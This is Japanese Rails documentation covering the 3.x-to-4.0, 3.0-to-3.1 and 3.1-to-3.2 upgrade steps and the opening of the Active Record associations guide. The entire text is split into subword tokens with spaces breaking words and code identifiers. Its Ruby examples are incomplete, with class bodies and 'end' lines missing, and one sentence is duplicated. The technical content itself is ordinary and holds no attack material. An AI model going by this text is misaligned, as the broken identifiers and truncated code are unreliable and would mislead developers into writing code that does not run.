▁* ▁Rails ▁4.0 では 、 ハッシュ を使用する 旧 来 の find er ▁API が 非推奨 と なりました 。 これまで find er オプションを 受け 付け ていた メソッドは 、 これらの オプションを 今後 受け 付け なくなります
▁たとえば 、` Book . find (: all , ▁ con d it ions : ▁ { ▁name : ▁' 19 8 4 ' ▁ }) ` は 非推奨 です 。 今後 は ` Book . where ( name : ▁' 19 8 4 ') ` を ご 使用 ください 。
▁* ▁ 動的な メソッドは 、` find _ by _ ... ` と ` find _ by _ ... !` を 除 いて 非推奨 と なりました 。
▁ 以下のように 変更 してください 。
▁* ▁` find _ all _ by _ ... ` ▁ に 代 え て ▁` where (...)
▁* ▁` find _ last _ by _ ... ` ▁ に 代 え て ▁` where (...) . last ` ▁ を使用
▁* ▁` scope d _ by _ ... ` ▁ に 代 え て ▁` where (...) ` ▁ を使用
▁* ▁` find _ or _ initialize _ by _ ... ` ▁ に 代 え て ` find _ or _ initialize _ by (...) ` を使用
▁* ▁` find _ or _ create _ by _ ... ` ▁ に 代 え て ` find _ or _ create _ by (...) ` を使用
▁* ▁ 旧 来 の find er が 配列 を返し ていた の に 対 し 、` where (...) ` は リレーション を返します 。
▁` Array ` が 必要な 場合は , ▁` where (...) . to _ a ` を使用して ください 。
▁* ▁これらの 同 等 な メソッドが 実行 する SQL は 、 従来 の実装 と同じ ではありません 。
▁* ▁ 旧 来 の find er を 再度 有効 に したい場合は 、[ active record - de pre cat ed _ find er s ▁gem ]( https :// github . com / rails / active record - de pre cat ed _ find er s ) ▁ を使用できます 。
▁### ▁Active ▁ Re source
▁Rails ▁4.0 では Active ▁ Re source が gem 化 されました 。
▁この 機能 が 必要な 場合は [ Active ▁ Re source ▁gem ]( https :// github . com / rails / active resource ) ▁ を Gemfile に追加 できます 。
▁### ▁Active ▁ Model
▁* ▁Rails ▁4.0 では ` Active Model :: V al id ation s :: Co n fi rm ation V al id at or ` に エラー が ア タ ッ チ される 方法 が変更され ました 。
▁ 確認 バリデーション が 失敗した ときに 、` attribute ` ではなく `: # { attribute } _ confirmation ` に ア タ ッ チ される ようになりました 。
▁* ▁Rails ▁4.0 の ` Active Model :: S e ri al ize r s :: JSON . include _ root _ in _ json ` の デフォルト値 が ` false ` に変更 されました 。
▁これにより 、 Active ▁ Model ▁S e ri al ize r s と Active ▁Record オブジェクトの デフォルトの 動作 が 同じ に なりました 。
▁これにより 、` config / initializers / w r a p _ parameters . rb ` ファイルの 以下の オプションを コメントアウト したり 削除 したり できるようになりました 。
▁# ▁ JSON の ルート 要素 を デフォルトで 無効 にする
▁# ▁ ActiveSupport . on _ load (: active _ record ) ▁do
▁self . include _ root _ in _ json ▁= ▁false
▁# ▁end
▁### ▁Action ▁P ack
▁* ▁Rails ▁4.0 から ` ActiveSupport :: K e y G en er at or ` が 導入 され 、 署 名 付き cookies の 生成 と 照 合 など に 使用される ようになりました 。
▁Rails ▁3 . x で 生成された 既存の 署 名 付き cookies は 、 既存の ` secret _ token ` は そのまま に して ` secret _ key _ base ` を 新しく 追加 することで 透 過 的に アップグレード されます 。
▁# ▁config / initializers / secret _ token . rb
▁ M y app :: Application . config . secret _ token ▁= ▁' ex ist ing ▁ secret ▁ token '
▁ M y app :: Application . config . secret _ key _ base ▁= ▁' new ▁ secret ▁ key ▁ base '
▁ 注意 : ` secret _ key _ base ` を設定する のは 、 Rails ▁4 . x への ユーザー ベース の 移 行 が 100 % 完了 し 、 Rails ▁3 . x に ロー ル バ ッ ク する必要が 完全に なく な って から に してください 。
▁これは 、 Rails ▁4 . x の 新しい ` secret _ key _ base ` を使用して 署 名 された cookies には Rails ▁3 . x の cookies と の 後 方 互 換 性 がない ためです 。
▁ 他の アップグレード が 完全に 完了 する まで は 、 既存の ` secret _ token ` を そのまま に して ` secret _ key _ base ` を 設定 せ ず 、 非推奨 警 告 を 無視 する という 選択 肢 もあります 。
▁ 外部 アプリケーション や JavaScript から Rails アプリケーションの 署 名 付き セッション cookies ▁( または 一 般 の 署 名 付き cookies ) ▁ を 読み 出 せる 必要がある 場合は 、 これらの 問題 を 切り 離 す まで は ` secret _ key _ base ` を 設定 しないでください 。
▁* ▁Rails ▁4.0 では 、` secret _ key _ base ` が 設定 されている と cookie ベース の セッション の内容 が 暗号化 されます 。
▁Rails ▁3 . x では cookie ベース の セッション への 署 名 は 行われます が 暗号化 は 行 わ れ ません 。
▁ 署 名 付き cookies は 、 その Rails アプリケーションで 生成された ことが 確認 でき 、 不 正 が 防止 される という 意味 では 安全 です 。
▁しかし セッション の内容 は エ ンド ユーザー から 見え てしまいます 。 内容 を 暗号化 することで 懸 念 を 取り 除 く ことができ 、 パ フ ォ ー マ ン ス の 低 下 も それ ほど ありません 。
▁ セッション cookies を 暗号化 する方法 の詳細については [ P ul l ▁ Request ▁# 99 7 8 ]( https :// github . com / rails / rails / pull / 99 7 8 ) ▁ を参照してください 。
▁* ▁Rails ▁4.0 ▁ では ` ActionController :: Base . asset _ path ` オプション が 廃 止 されました 。
▁ 代りに アセットパイプライン 機能を ご 利用 ください 。
▁* ▁Rails ▁4.0 では ` ActionController :: Base . page _ cache _ ext en s ion ` オプション が 非推奨 に なりました 。
▁ 代りに ` ActionController :: Base . default _ static _ ext en s ion ` を ご 利用 ください 。
▁* ▁Rails ▁4.0 の Action ▁P ack から Action と P age の キャッシュ 機能 が 取り 除 か れ ました 。
▁ コントローラ で ` cache s _ action ` を使用したい場合 は ` action p ack - action _ ca ch ing ` ▁gem を 、` cache s _ pages ` を使用したい場合 は ` action p ack - page _ ca ch ing ` ▁gem を それぞれ Gemfile に 追加する必要があります 。
▁* ▁Rails ▁4.0 から XML パラメータ パ ー サ ー が 取り 除 か れ ました 。
▁この 機能 が 必要な 場合は ` action p ack - xml _ p ar s er ` ▁gem を 追加する必要があります 。
▁* ▁Rails ▁4.0 の デフォルトの me m cache d クライアント が ` me m cache - client ` から ` d all i ` に変更 されました 。
▁ アップグレード するには 、 単 に ` gem ▁' d all i ' ` を ` Gemfile ` に追加します 。
▁* ▁Rails ▁4.0 では コントローラ で の ` do m _ id ` および ` do m _ class ` メソッドの 使用 が 非推奨 に なりました ▁( ビューで の 使用 は 問題 ありません )。
▁この 機能 が 必要な コントローラ では ` ActionView :: Re c or d I d ent if i er ` モジュール を インクルード する必要があります 。
▁* ▁Rails ▁4.0 では ` link _ to ` ヘルパー で の `: confirm ` オプション が 非推奨 に なりました 。
▁ 代りに データ 属性 を使用して ください ▁( 例 : ▁` data : ▁ { ▁ confirm : ▁' A re ▁you ▁ s ur e ? ' ▁ } ` )。
▁` link _ to _ if ` や ` link _ to _ unless ` など でも 同様 の 対応 が必要です 。
▁* ▁Rails ▁4.0 では ` assert _ generate s `、` assert _ re co g n ize s `、` assert _ routing ` の動作 が変更され ました 。
▁これらの アサーション から は ` ActionController :: R out ing Error ` の 代りに ` A s s er tion ` が発生する ようになりました 。
▁* ▁Rails ▁4.0 では 、 名前付きルート の 定義 が 重複 している 場合に ` A r g um ent Error ` が発生する ようになりました 。
▁この エラー は 、 明示的に 定義された 名前付きルート や ` resources ` メソッド によって トリガ されます 。
▁ 名前付きルート ` example _ path ` が 衝 突 している 例 を 2 つ 示 します 。
▁get ▁' one ' ▁=> ▁' test # example ', ▁as : ▁: example
▁get ▁' two ' ▁=> ▁' test # example ', ▁as : ▁: example
▁ resources ▁: example s
▁ 最初の 例 では 、 複数の ルーティング で 同じ 名前 を使用し ないように すれば 回 避 できます 。
▁* ▁Rails ▁4.0 では un i code 文字 の ルーティング の 描 出 方法 が変更され ました 。
▁ un i code 文字 を使用する ルーティング を直接 描 出 できるようになりました 。
▁ 既に このような ルーティング を 使用している 場合は 、 以下の 変更 が必要です 。
▁get ▁ Rack :: U t il s . es ca p e (' こ ん に ち は ') , ▁ controller : ▁' welcome ', ▁ action : ▁' index '
▁上のコードは 以下のように 変更 する必要があります 。
▁get ▁' こ ん に ち は ', ▁ controller : ▁' welcome ', ▁ action : ▁' index '
▁* ▁Rails ▁4.0 で ルーティング に ` match ` を使用する場合 は 、 リクエスト メソッドの 指定 が 必 須 と なりました 。
▁# ▁Rails ▁3 . x
▁ match ▁' / ' ▁=> ▁' root # index '
▁上のコードは 以下のように 変更 する必要があります 。
▁ match ▁' / ' ▁=> ▁' root # index ', ▁ v i a : ▁: get
▁# ▁ または
▁get ▁' / ' ▁=> ▁' root # index '
▁* ▁Rails ▁4.0 から ` ActionDispatch :: B e st S t and ar d s S up port ` ミドルウェア が 削除 されました 。 ` < ! D O C T Y P E ▁ html > ` は 既に ▁ http :// m s d n . m i c r o s of t . com / en - us / lib r ary / j j 6 7 6 9 15 ( v = v s . 8 5 ). as p x ▁ の 標準 モード を トリガ する ように なり 、 C h r o me F r am e ヘッダ は ` config . action _ dispatch . default _ header s ` に 移動 されました 。
▁ アプリケーション コード 内に ある この ミドルウェア への 参 照 はすべて 削除 する必要があります ので 注意 が必要です 。 例 :
▁# ▁ 例外 発生
▁config . middleware . in s er t _ before ( Rack :: L ock , ▁ ActionDispatch :: B e st S t and ar d s S up port )
▁ 環境 設定 も 確認 し 、` config . action _ dispatch . b e st _ st and ar d s _ support ` がある場合 は 削除 します 。
▁* ▁Rails ▁4.0 の アセット の プリコンパイル では 、` vendor / assets ` および ` lib / assets ` にある 非 J S / CSS アセット を 自動的に は コピー し なく なりました 。
▁Rails アプリケーション と エンジンの 開発者 は 、 これらの アセット を 手動で ` app / assets ` に置き 、` config . assets . pre compile ` を 設定 してください 。
▁* ▁Rails ▁4.0 では 、 リクエスト された フォーマット が アクション で 扱 え なかった 場合に ` ActionController :: U n k now n Form at ` が発生する ようになりました 。
▁ デフォルトで は 、 この 例外 は 4 06 ▁ No t ▁A c ce p table 応答 として 扱 わ れ ます が 、 この 動作 を オーバーライド することができます 。
▁Rails ▁3 では 常に 4 06 ▁ No t ▁A c ce p table が返されます 。
▁ オーバーライド は できません 。
▁* ▁Rails ▁4.0 では 、` P ar am s P ar s er ` が リクエスト パラメータ を パ ー ス でき なかった 場合に 一般的な ` ActionDispatch :: P ar am s P ar s er :: P ar s e Error ` 例外 が発生する ようになりました 。
▁` M ulti J s on :: D e code Error ` のような 低 レベル の 例外 の 代りに この 例外 を レ ス キュー することができます 。
▁* ▁Rails ▁4.0 では 、 URL プレフィックス で 指定された アプリケーションに エンジン が マウント されている 場合に ` S C R I P T _ N A M E ` が正しく 入 れ 子 になる ようになりました 。
▁ 今後 は URL プレフィックス の 上 書き を 回 避 するために ` default _ url _ options [: script _ name ] ` を設定する 必要はありません 。
▁* ▁Rails ▁4.0 では ` ActionDispatch :: In te gra tion ` の 導入 に 伴 い ` ActionController :: In te gra tion ` が 非推奨 と なりました 。
▁* ▁Rails ▁4.0 では ` ActionDispatch :: In te gra tion Test ` の 導入 に 伴 い ` ActionController :: In te gra tion Test ` は 非推奨 と なりました 。
▁* ▁Rails ▁4.0 では ` ActionDispatch :: P er form an ce Test ` の 導入 に 伴 い ` ActionController :: P er form an ce Test ` が 非推奨 と なりました 。
▁* ▁Rails ▁4.0 では ` ActionDispatch :: Request ` の 導入 に 伴 い ` ActionController :: A b s tr a ct Request ` が 非推奨 と なりました 。
▁* ▁Rails ▁4.0 では ` ActionDispatch :: Request ` の 導入 に 伴 い ` ActionController :: Request ` が 非推奨 と なりました 。
▁* ▁Rails ▁4.0 では ` ActionDispatch :: Re s p on s e ` の 導入 に 伴 い ` ActionController :: A b s tr a ct Re s p on s e ` が 非推奨 と なりました 。
▁* ▁Rails ▁4.0 では ` ActionDispatch :: Re s p on s e ` の 導入 に 伴 い ` ActionController :: Re s p on s e ` が 非推奨 と なりました 。
▁* ▁Rails ▁4.0 では ` ActionDispatch :: R out ing ` の 導入 に 伴 い ` ActionController :: R out ing ` が 非推奨 と なりました 。
▁### ▁Active ▁Support
▁Rails ▁4.0 では ` ERB :: U t il # json _ es ca p e ` の エイリアス ` j ` が 廃 止 されました 。 この エイリアス ` j ` は 既に ` ActionView :: Helper s :: JavaScript Helper # es ca p e _ javascript ` で 使用されている ためです 。
▁### ▁ ヘルパー の 読み込み 順序
▁Rails ▁4.0 では 複数の ディレクトリ から の ヘルパー の 読み込み 順 が変更され ました 。
▁ 以前 は すべての ヘルパー を い った ん 集 め て から ア ル フ ァ ベ ッ ト 順に ソ ート していました 。
▁Rails ▁4.0 に アップグレード すると 、 ヘルパーは 読み込まれ た ディレクトリ の 順序 を保持し 、 ソ ート は 各 ディレクトリ 内で のみ 行われます 。
▁` helpers _ path ` パラメータ を 明示的に 使用している 場合 を 除 いて 、 この 変更 は エンジン から ヘルパー を 読み込む 方法 に しか 影 響 しません 。
▁ ヘルパー 読み込み の 順序 に 依 存 している 場合は 、 アップグレード 後に 正しい メソッドが 使用 でき ている かどうかを確認 する必要があります 。
▁ エンジン が 読み込まれ る 順序 を変更 したい場合は 、` config . railties _ order = ` ▁ メソッド を使用できます 。
▁### ▁Active ▁Record ▁ O b server と Action ▁ Controller ▁S w e e per
▁` Active ▁Record ▁ O b server ` と ` Action ▁ Controller ▁S w e e per ` は ` rails - o b server s ` ▁gem に 切り 出 されました 。
▁これらの 機能 が 必要な 場合は ` rails - o b server s ` ▁gem を追加し てください 。
▁### ▁ s pro c ke t s - rails
▁* ▁` assets : pre compile : primary ` および ` assets : pre compile : all ` は 削除 されました 。
▁` assets : pre compile ` を 代りに 使用 してください 。
▁* ▁` config . assets . com pre s s ` オプションは 、 たとえば 以下のように ` config . assets . js _ compressor ` ▁ に変更 する必要があります 。
▁config . assets . js _ compressor ▁= ▁: ug li fi er
▁### ▁ sass - rails
▁* ▁ 引数 を 2 つ 使用する ` asset - url ` は 非推奨 と なりました 。
▁たとえば 、` asset - url (" rails . png ", ▁ image ) ` は ` asset - url (" rails . png ") ` と する必要があります 。
▁Rails ▁ 3.1 から Rails ▁3.2 への アップグレード
▁Rails アプリケーション のバージョン が 3.1 より 前 の場合 、 まず 3.1 への アップグレード を 完了 して から Rails ▁3.2 への アップグレード に と り か か って ください 。
▁Rails アプリケーション のバージョン が 3.1 よりも 古 い 場合 、 まず 3.1 への アップグレード を 完了 して から Rails ▁3.2 への アップグレード を 開 始 してください 。
▁` Gemfile ` を 以下のように 変更 します 。
▁ group ▁: assets ▁do
▁gem ▁' sass - rails ', ▁' ~ > ▁3.2 . 6 '
▁gem ▁' coffee - rails ', ▁' ~ > ▁3.2 . 2 '
▁gem ▁' ug li fi er ', ▁' > = ▁1. 0 . 3 '
▁### ▁config / environments / development . rb
▁ development 環境 に いくつかの 新しい 設定 を 追加する必要があります 。
▁# ▁Active ▁Record の モデル を マ ス ア サ イン メ ン ト から 保 護 するために 例外を発生 する
▁config . active _ record . ma s s _ as sign m ent _ sanitize r ▁= ▁: st ri ct
▁# ▁ クエリ の 実行 計 画 ▁( クエリ プ ラ ン ) ▁ を 現在 より 多く 出力 する
▁# ▁( SQLite 、 MySQL 、 PostgreSQL で 動作 )
▁config . active _ record . auto _ ex plain _ th re sh ol d _ in _ sec on d s ▁= ▁0 . 5
▁### ▁config / environments / test . rb
▁` ma s s _ as sign m ent _ sanitize r ` 設定 を ` config / environments / test . rb ` にも 追加する必要があります 。
▁` vendor / p l ug in s ` ▁ は Rails ▁3.2 で 非推奨 と なり 、 Rails ▁4.0 では 完全に 削除 されました 。
▁Rails ▁3.2 への アップグレード では 必 須 ではありません が 、 今 のうち に プラグイン を gem に エ ク ス ポート して Gemfile に追加する の が よいでしょう 。
▁`: dependent ▁=> ▁: re st ri ct ` オプションは ` belongs _ to ` から 削除 されました 。
▁ 関連付けられたオブジェクト がある場合 に この オブジェクト を削除し たくない 場合は 、`: dependent ▁=> ▁: destroy ` を 設定 し 、 関連付けられたオブジェクト の destroy コールバック と の 関連付け がある かどうかを確認 して から ` false ` を返す ようにします 。
▁Rails ▁ 3.0 から Rails ▁ 3.1 への アップグレード
▁Rails アプリケーション のバージョン が 3.0 より 前 の場合 、 まず 3.0 への アップグレード を 完了 して から Rails ▁ 3.1 への アップグレード に と り か か って ください 。
▁以下の 変更 は 、 Rails ▁ 3.1 . x の 最 新 版 である Rails ▁ 3.1 . 12 に アップグレード する ためのものです 。
▁gem ▁' rails ', ▁' 3.1 . 12 '
▁gem ▁' my sql 2 '
▁# ▁ 新しい アセットパイプライン で 必要
▁gem ▁' sass - rails ', ▁' ~ > ▁ 3.1 . 7 '
▁gem ▁' coffee - rails ', ▁' ~ > ▁ 3.1 . 1 '
▁# ▁Rails ▁ 3.1 から j Query が デフォルトの JavaScript ライブラリ になる
▁gem ▁' jquery - rails '
▁### ▁config / application . rb
▁ アセットパイプライン を使用する ために 以下の 変更 が必要です 。
▁config . assets . en able d ▁= ▁true
▁config . assets . version ▁= ▁' 1 . 0 '
▁Rails アプリケーションで リソース の ルーティング に " / assets " ルート を 使用している 場合 、 コ ン フ リ ク ト を避ける ために 以下の 変更 を加え ます 。
▁# ▁' / assets ' の デフォルト
▁config . assets . prefix ▁= ▁' / asset - file s '
▁ R J S ▁ の設定 ` config . action _ view . debug _ r js ▁= ▁true ` を削除し てください 。
▁ アセットパイプライン を有効に している 場合は 以下の 設定 を追加します 。
▁# ▁ 開発環境 では アセット を 圧 縮 しない
▁config . assets . com pre s s ▁= ▁false
▁# ▁ アセット で 読み 込 んだ 行 を 展開 する
▁config . assets . debug ▁= ▁true
▁### ▁config / environments / production . rb
▁以下の 変更 は ほとんど が アセットパイプライン 用 です 。
▁詳細については ▁[ アセットパイプライン ]( asset _ pipeline . html ) ▁ ガイド を参照してください 。
▁# ▁ JavaScript と CSS を 圧 縮 する
▁config . assets . com pre s s ▁= ▁true
▁# ▁ プリコンパイル 済み の アセット が 見 当 たら ない場合 に アセットパイプライン に フ ォ ー ル バ ッ ク しない
▁config . assets . compile ▁= ▁false
▁# ▁ アセット URL の ダイジェスト を生成する
▁config . assets . digest ▁= ▁true
▁# ▁Rails . root . join (" public / assets ") への デフォルト
▁# ▁config . assets . ma n if e st ▁= ▁ 該当する パス
▁# ▁ 追加 の アセット ▁( application . js 、 application . css および すべての 非 J S / CSS が 追加 済み ) ▁ を プリコンパイル する
▁# ▁config . assets . pre compile ▁+ = ▁% w ( ▁ search . js ▁ )
▁# ▁ アプリケーション への すべての アクセス を 強 制 的に SSL に し 、 S t ri ct - T r an s port - S ec ur ity と セキュア ク ッ キー を使用する
▁# ▁config . force _ s s l ▁= ▁true
▁ テスト 環境 に 以下 を追加する ことで テスト の パ フ ォ ー マ ン ス が 向 上 します 。
▁# ▁ Cache - Control を使用する テスト で 静 的 アセット サーバー を 構成 し 、 パ フ ォ ー マ ン ス を 向 上 させる
▁config . static _ cache _ control ▁= ▁' public , ▁ ma x - age = 3 6 00 '
▁### ▁config / initializers / w r a p _ parameters . rb
▁ ネスト した ハッシュ に パラメータ を含め たい場合は 、 この ファイルに 以下の コンテンツ を含め て 追加 します 。
▁ 新しい アプリケーション では これ が デフォルト になります 。
▁# ▁この ファイルを 変更 後 サーバー を 必ず 再 起動 してください 。
▁# ▁この ファイル には ActionController :: P ar am s W r app er 用の 設定 が含まれ ており
▁# ▁ デフォルトで オン になっています 。
▁# ▁ JSON 用 に パラメータ を ラ ッ プ します 。 : format に 空 配列 を設定する ことで 無効 に できます 。
▁ ActiveSupport . on _ load (: action _ controller ) ▁do
▁ w r a p _ parameters ▁ format : ▁ [: json ]
▁ ActiveSupport . on _ load (: active _ record ) ▁do
▁self . include _ root _ in _ json ▁= ▁false
▁### ▁config / initializers / session _ store . rb
▁ 何らかの 新しい セッション キー を設定する か 、 すべての セッション を削除する か の どちら か に する必要があります 。
▁# ▁config / initializers / session _ store . rb に 以下 を設定する
▁A p p Name :: Application . config . session _ store ▁: cookie _ store , ▁ key : ▁' S O M E T H ING N E W '
▁$ ▁ bin / rake ▁ db : sessions : clear
▁### ▁ ビュー の アセット ヘルパー 参 照 から : cache オプション と : con cat オプション を削除する
▁* ▁ Asset ▁Pipeline の : cache オプション と : con cat は 廃 止 されました 。 ビュー から これらの オプションを 削除 してください 。
▁Active ▁Record ▁ の 関連付け ▁( ア ソ シ エ ー ション )
▁この ガイド では 、 Active ▁Record の 関連付け 機能 ( ア ソ シ エ ー ション ) について解説します 。
▁* ▁Active ▁Record の モデル 同士 の 関連付けを 宣言 する方法
▁* ▁Active ▁Record の モデル を 関連付け る さまざまな 方法
▁* ▁ 関連付け を作成する と 自動的に 追加 される メソッドの 使用 方法
▁ 関連付け を使用する 理由
▁ モデルと モデル の間に は 関連付け を行なう 必要があります が 、 その 理由 を 御 存 じ でしょう か 。
▁ 関連付け を行なう のは 、 それ によって コード 内で 一般的 に 行 わ れる 操作 を は る か に 簡単に できる からです 。
▁ 簡単な Rails アプリケーションを 例 にとって 説明 しましょう 。 この アプリケーション には 顧 客 用の モデル ( Customer ) と 注文 用の モデル ( Order ) があります 。
▁ 一 人 の 顧 客 は 、 多くの 注文 を行なう ことができます 。
▁ 関連付けを 設定 していない 状態 では 、 モデルの 宣言 は以下のようになります 。
▁class ▁ Customer ▁< ▁ActiveRecord :: Base
▁ここで 、 既存の 顧 客 のために 新しい 注文 を 1 つ 追加 した く な った とします 。
▁ この場合 、 以下のような コード を実行する 必要がある でしょう 。
▁@ order ▁= ▁ Order . create ( order _ date : ▁ Time . now , ▁ customer _ id : ▁@ customer . id )
▁今度は 顧 客 を削除する 場合 を 考えてみましょう 。 顧 客 を削除する なら 、 以下のように 、 顧 客 の 注文 も 残 らず 削除 される ように して お か なければなりません 。
▁@ orders ▁= ▁ Order . where ( customer _ id : ▁@ customer . id )
▁@ orders . each ▁do ▁| order |
▁ order . destroy
▁@ customer . destroy
▁Active ▁Record の 関連付け 機能 を使用すると 、 2 つの モデル の間に つ な が り がある ことを 明示的に Rails に対して 宣言 する ことができ 、 それ によって モデルの 操作 を 一 貫 させる ことができます 。
▁ 顧 客 と 注文 を設定する コードを 次のように 書き 直 します 。
▁has _ many ▁: orders , ▁ dependent : ▁: destroy
▁ belongs _ to ▁: customer
▁上の ように 関連付け を追加した ことで 、 特定の 顧 客 用 に 新しい 注文 を 1 つ 作成する 作業 が 以下のように 一 行 で できるようになりました 。
▁@ order ▁= ▁@ customer . orders . create ( order _ date : ▁ Time . now )
▁ 顧 客 と 、 顧 客 の 注文 を まとめ て 削除 する 作業 は さらに 簡単 です 。
▁その 他の 関連付け 方法 については 、 次の 節 を お 読み ください 。
▁ それ に 続いて 、 関連付け に関する さまざまな ヒント や 活用 方法 、 Rails の 関連付け メソッドと オプション の 完全な 参 照 物 も ご 紹 介 します 。
▁ 関連付け の 種類
▁Rails では 、「 関連付け ( ア ソ シ エ ー ション : ▁ association )」 とは 2 つの Active ▁Record モデル 同士 の つ な が り を 指 します 。
▁ 関連付け は 、 一 種 の マクロ 的な 呼び出し として 実装 され ており 、 これ によって モデル 間 の 関連付けを 宣言 的に 追加 することができます 。
▁たとえば 、 ある モデル が 他の モデルに 従 属 している ( ` belongs _ to ` ) と 宣言 すると 、 2 つの モデルの それぞれの インスタンス 間 で 「 主キー ▁- ▁ 外部キー 」 情報 を保持し ておく ように Rails に 指示 が 伝 わ ります 。
▁Rails で サポート されている 関連付け は 以下の 6 種類 です 。
▁* ▁` belongs _ to `
▁* ▁` has _ one `
▁* ▁` has _ many `
▁* ▁` has _ many ▁: through `
▁* ▁` has _ one ▁: through `
▁* ▁` has _ and _ belongs _ to _ many `
▁ 本ガイドで は この後 、 それぞれの 関連付け の 宣言 方法 と 使用 方法 について 詳 しく 解説します 。
▁その 前に 、 それぞれの 関連付け が 適 切 となる 状 況 について 簡単に ご 紹 介 しましょう 。
▁### ▁` belongs _ to ` 関連付け
▁ ある モデル で ` belongs _ to ` 関連付け を行なう と 、 他 方 の モデルと の間に 「 1 対 1 」 の つ な が り が 設定 されます 。 このとき 、 宣言 を 行った モデルの すべての インスタンス は 、 他 方 の モデルの インスタンス に 「 従 属 ( belongs ▁to )」 します 。
▁たとえば 、 Rails アプリケーションに 顧 客 ( customer ) と 注文 ( order ) 情報 が含まれ ており 、 1 つの 注文 に つ き 正 確 に 1 人 の 顧 客 だけ を 割り当て たい のであれば 、 Order モデル で 以下のように 宣言 します 。
▁ belongs _ to ▁ 関連付け の 図 ]( images / belongs _ to . png )
▁NOT E : ▁` belongs _ to ` 関連付け で 指定 する モデル名 は 必ず 「 単数形 」 に し なければなりません 。
▁上の 場合 、` Order ` モデル における 関連付け の ` customer ` を 複数形 の ` customer s ` に してしまう と 、 " un initialize d ▁ const an t ▁ Order :: Customer s " ▁ エラーが発生し ます 。
▁Rails は 、 関連付け の名前 から 自動的に モデルの クラス名 を 推測 します 。 関連付け 名 が ` customer ` なら クラス名 を ` Customer ` と 推測 します 。
▁従って 、 関連付け 名 が 誤 って 複数形 になって し ま っている と 、 そこ から 推測 される クラス名 も 誤 って 複数形 になってしまい ます 。
▁上の 関連付け に対応する マイグレーション は 以下のような感じ になります 。
▁class ▁ Create Order s ▁< ▁ActiveRecord :: Migration
▁create _ table ▁: customer s ▁do ▁| t |
▁t . string ▁: name
▁create _ table ▁: orders ▁do ▁| t |
▁t . belongs _ to ▁: customer
▁t . date time ▁: order _ date
▁### ▁` has _ one ` 関連付け
▁` has _ one ` 関連付け も 、 他 方 の モデルと の間に 1 対 1 の 関連付け を設定します 。 しかし 、 その 意味 と 結果 は ` belongs _ to ` とは 若 干 異なります 。
▁` has _ one ` 関連付け の場合は 、 その 宣言 が 行われている モデルの インスタンス が 、 他 方 の モデルの インスタンス を 「 ま る ご と 含 んで いる 」 または 「 所 有 している 」 こと を示します 。
▁たとえば 、 供 給 者 ( supplier ) 1 人 に つ き アカウント ( account ) を 1 つ だけ 持つ という 関係 がある のであれば 、 以下のように 宣言 を行います 。
▁class ▁S up p li er ▁< ▁ActiveRecord :: Base
▁has _ one ▁: account
▁has _ one 関連付け の 図 ]( images / has _ one . png )
▁class ▁ Create S up p li er s ▁< ▁ActiveRecord :: Migration
▁create _ table ▁: supplier s ▁do ▁| t |
▁create _ table ▁: account s ▁do ▁| t |
▁t . belongs _ to ▁: supplier
▁t . string ▁: account _ number
▁### ▁` has _ many ` 関連付け
▁` has _ many ` 関連付け は 、 他の モデルと の間に 「 1 対 多 」 の つ な が り がある こと を示します 。
▁` has _ many ` 関連付け が 使用されている 場合 、「 反 対 側 」 の モデル では ` belongs _ to ` が 使用される ことが 多く あります 。
▁` has _ many ` 関連付け が 使用されている 場合 、 その モデルの インスタンス は 、 反 対 側 の モデルの 「 0 個 以上 の 」 インスタンス を 所 有 します 。
▁たとえば 、 顧 客 ( customer ) と 注文 ( order ) を含む Rails アプリケーション では 、 顧 客 の モデル を 以下のように 宣言 することができます 。
▁NOT E : ▁` has _ many ` 関連付けを 宣言 する 場合 、 相手 の モデル名 は 「 複数形 」 に する必要があります 。
▁has _ many 関連付け の 図 ]( images / has _ many . png )
▁class ▁ Create Customer s ▁< ▁ActiveRecord :: Migration
▁### ▁` has _ many ▁: through ` 関連付け
▁` has _ many ▁: through ` 関連付け は 、 他 方 の モデルと 「 多 対 多 」 の つ な が り を設定する 場合に よく 使われ ます 。
▁この 関連付け は 、 2 つの モデル の間に 「 第 3 の モデル 」( 結合 モデル ) が 介 在 する 点が 特 徴 です 。 それ によって 、 相手 モデルの 「 0 個 以上 」 の インスタンス と マッチ します 。
▁たとえば 、 患 者 ( patient ) が 医師 ( ph y s i c i an ) と の 診 察 予 約 ( app o in t m ent ) を 取 る 医療 業 務 を 考え て み ます 。
▁ この場合 、 関連付け は 次のような 感 じ になる でしょう 。
▁class ▁P h y s i c i an ▁< ▁ActiveRecord :: Base
▁has _ many ▁: app o in t m ent s
▁has _ many ▁: patient s , ▁ through : ▁: app o in t m ent s
▁class ▁A p p o in t m ent ▁< ▁ActiveRecord :: Base
▁ belongs _ to ▁: ph y s i c i an
▁ belongs _ to ▁: patient
▁class ▁P at i ent ▁< ▁ActiveRecord :: Base
▁has _ many ▁: ph y s i c i an s , ▁ through : ▁: app o in t m ent s
▁has _ many ▁: through 関連付け の 図 ]( images / has _ many _ through . png )
▁class ▁ Create A p p o in t m ent s ▁< ▁ActiveRecord :: Migration
▁create _ table ▁: ph y s i c i an s ▁do ▁| t |
▁create _ table ▁: patient s ▁do ▁| t |
▁create _ table ▁: app o in t m ent s ▁do ▁| t |
▁t . belongs _ to ▁: ph y s i c i an
▁t . belongs _ to ▁: patient
▁t . date time ▁: app o in t m ent _ date
▁ 結合 モデル ( join ▁ model ) の コレクション は 、 API 経由で 管理 できます 。 たとえば 、 以下のような 割り当て を実行し た とします 。
▁ ph y s i c i an . patient s ▁= ▁ patient s
▁このとき 、 新 た に 関連付けられたオブジェクト について 、 新しい 結合 モデル が 作成されます 。 結合 時に 不 足 している 部分 があれば 、 その 行 は 結合 モデル から 削除 され 、 結合 モデルに 含 まれ なくなります 。
▁WARN ING : ▁ モデル 結合 時の 不 足 分 自動 削除 は 即 座 に 行われます 。 さらに 、 その 際に destroy コールバック は トリガ ー されません ので 注意 が必要です 。
▁` has _ many ▁: through ` 関連付け は 、 ネスト した ` has _ many ` 関連付けを 介 して 「 シ ョ ート カ ッ ト 」 を設定する 場合に も 便利です 。
▁たとえば 、 1 つの ドキュメント に 多くの 節 ( section ) があり 、 1 つの 節 の下に 多くの 段 落 ( p ar a gra ph ) がある 状態 で 、 節 を スキップ して ドキュメント の 下 の すべての 段 落 の 単純な コレクション が 欲 しい とします 。
▁その 場合 、 以下の 方法で 設定 できます 。
▁class ▁D o c um ent ▁< ▁ActiveRecord :: Base
▁has _ many ▁: section s
▁has _ many ▁: p ar a gra ph s , ▁ through : ▁: section s
▁class ▁S ec tion ▁< ▁ActiveRecord :: Base
▁ belongs _ to ▁: document
▁has _ many ▁: p ar a gra ph s
